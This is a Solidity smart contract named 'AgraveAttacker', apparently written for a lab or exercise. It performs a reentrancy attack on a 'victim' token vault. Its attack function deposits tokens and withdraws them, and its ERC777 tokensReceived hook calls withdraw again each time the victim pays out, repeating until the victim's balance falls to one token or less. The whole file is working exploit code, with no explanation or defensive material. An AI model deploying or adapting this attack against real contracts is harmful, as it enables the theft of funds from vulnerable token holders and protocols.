// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "./IAgraveVictim.sol";
import "./IAgraveToken.sol";

contract AgraveAttacker is IERC777Recipient {
    IAgraveVictim victim;
    IAgraveToken token;

    constructor(IAgraveVictim victim_address, IAgraveToken token_address) {
        victim = victim_address;
        token = token_address;
    }

    function attack(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.increaseAllowance(address(victim), amount);
        victim.deposit(amount);
        victim.withdraw(address(this));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // mute the compiler warinings
        operator;
        from;
        to;
        amount;
        userData;
        operatorData;
        // may be a better expression in if statement,
        // this version may lead to REVERT;
        // 10 ** 18 in value == 1 AGT
        if (from != address(victim)){
            return;
        }
        if (token.balanceOf(address(from)) > 10 ** 18) {
            victim.withdraw(address(this));
        }
    }

    fallback() external {
        // no need, tokensReceived() is the fallback
    }
}
